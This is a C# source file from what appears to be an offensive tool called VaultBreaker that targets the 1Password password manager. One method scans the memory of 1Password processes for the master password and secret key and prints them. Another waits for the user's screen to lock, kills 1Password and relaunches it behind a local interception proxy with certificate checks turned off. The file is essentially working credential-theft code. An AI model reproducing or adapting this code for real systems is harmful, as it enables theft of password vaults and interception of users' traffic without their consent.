using System;
using System.Diagnostics;
using VaultBreaker.Helpers;

namespace VaultBreaker.Core
{
	class _1Password
	{

		//Enable Cleartext Passwords and then read memory.
		/**
		 *   "security": {
    "concealPasswords": false
  },
	**/

			//Step 1. Add that line to the 1Password
			//Step 2. Dump Memory(?)
			//Step 3. Passwords 


		public static void dump1password()
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("1Password");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
			foreach (var proc in procs)
			{
				#region oldcode
				/**
				//IntPtr hProc = proc.Handle;
				IntPtr hProc = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryInformation | WinAPI.ProcessAccessFlags.VirtualMemoryRead, false, proc.Id);
				WinAPI.MEMORY_BASIC_INFORMATION64 mbi = new WinAPI.MEMORY_BASIC_INFORMATION64();
				//32 bit
				//WinAPI.MEMORY_BASIC_INFORMATION mbi = new WinAPI.MEMORY_BASIC_INFORMATION()
				WinAPI.SYSTEM_INFO si = new WinAPI.SYSTEM_INFO();
				if (hProc == IntPtr.Zero)
				{
					//Failed.
					Console.WriteLine("Unable to create a connection to the process! Error Code: {0}", WinAPI.GetLastError());
					Environment.Exit(6);
				}

				WinAPI.GetSystemInfo(out si);
				IntPtr hProc_min_addr = si.minimumApplicationAddress;
				IntPtr hProc_max_addr = si.maximumApplicationAddress;
				long hProc_long_min = (long)hProc_min_addr;
				long hProc_long_max = (long)hProc_max_addr;
				string fileName = "dump-" + proc.Id + "-" + proc.ProcessName + "-2.txt";
				StreamWriter sw = new StreamWriter(fileName);

				int bytesRead = 0;

				while (hProc_long_min < hProc_long_max)
				{
					bytesRead = WinAPI.VirtualQueryEx(hProc, hProc_min_addr, out mbi, (uint)Marshal.SizeOf(typeof(WinAPI.MEMORY_BASIC_INFORMATION64)));
					if (mbi.Protect == WinAPI.PAGE_READWRITE && mbi.State == WinAPI.MEM_COMMIT)
					{
						byte[] buffer = new byte[mbi.RegionSize];
						WinAPI.ReadProcessMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, ref bytesRead);
						for (long i = 0; i < mbi.RegionSize; i++)
						{
							sw.Write((char)buffer[i]);
						}
					}
					hProc_long_min += mbi.RegionSize;
					hProc_min_addr = new IntPtr(hProc_long_min);
				}
				sw.Close();
				
				**/
				#endregion
				//Slightly Dirty, but keeping the <LF> conversion to help rule out False Positives in output. Will need to re-visit this most likely.
				//string strResult = File.ReadAllText(fileName).Replace("\n", "<LF>").Replace("\0", String.Empty);
				string strResult = MemoryHelper.dumpProcessMemory(proc).Replace("\n", "<LF>").Replace("\0", String.Empty);
				if (strResult.Contains("{\"name\":\"master-password\",\"value\":\""))
				{
					DebugFunctions.writeDebug("JSON FOUND");
					int start, end;
					//string strStartSearch = "{\"name\":\"master-password\",\"value\":\"";
					start = strResult.IndexOf("{\"name\":\"master-password\",\"value\":\"", 0) + 35;
					//string strEndSearch = ",\"type\":\"P\",\"designation\":\"password\"},{\"name\":\"account-key\"";
					end = strResult.IndexOf(",\"type\":\"P\",\"designation\":\"password\"},{\"name\":\"account-key\"", 0) - 1;
					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
				}
				else if (strResult.Contains("on 1password.com.<LF>")) {
					DebugFunctions.writeDebug("Testing Backup");
					int start, end;
					string strStartSearch = "on 1password.com.<LF>";
					start = strResult.IndexOf(strStartSearch, 0) + 20;
					end = strResult.IndexOf("<LF>secret key<LF>");
					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
					Console.ReadKey();
				}
				else
				{
					Console.WriteLine("Not Found");
					Console.ReadKey();
				}
				Console.WriteLine("Fin. Press any key to exit");
				Console.ReadKey();
			}
		}
		public static void LaunchWithProxy(bool force)
		{
			DebugFunctions.writeDebug("Hello from LWP");

			//Check if screen is locked.
			if (!force)
			{
				DebugFunctions.writeDebug("Waiting for Screen to lock before bouncing application");
				Monitoring.CheckForWorkstationLocking workLock = new Monitoring.CheckForWorkstationLocking();

				workLock.Run();

				Console.WriteLine("Press ESC to exit...");
				while (!workLock.screenLocked)
				{
					//wait a bit before checking again.
					System.Threading.Thread.Sleep(10000);
				};
				DebugFunctions.writeDebug("Screen lock notification recieved, continuing.");
			}
			string procPath = "";
			Process[] procs = Process.GetProcessesByName("1Password");
			if (procs.Length < 1)
			{
				DebugFunctions.writeDebug("No Processes found");
			}
			foreach (var proc in procs)
			{
				if (procPath == "")
				{
					procPath = proc.MainModule.FileName;
					DebugFunctions.writeDebug("Getting Process Path: " + procPath);
				}
				//Kill All current Running Processes.
				proc.Kill();
			}
			DebugFunctions.writeDebug("Starting Process with New Arguments");
			Process bw = new Process();
			bw.StartInfo.FileName = procPath;
			bw.StartInfo.Arguments = "--proxy-server=http://127.0.0.1:8888 --ignore-certificate-errors";
			bw.Start();
		}
	}
}
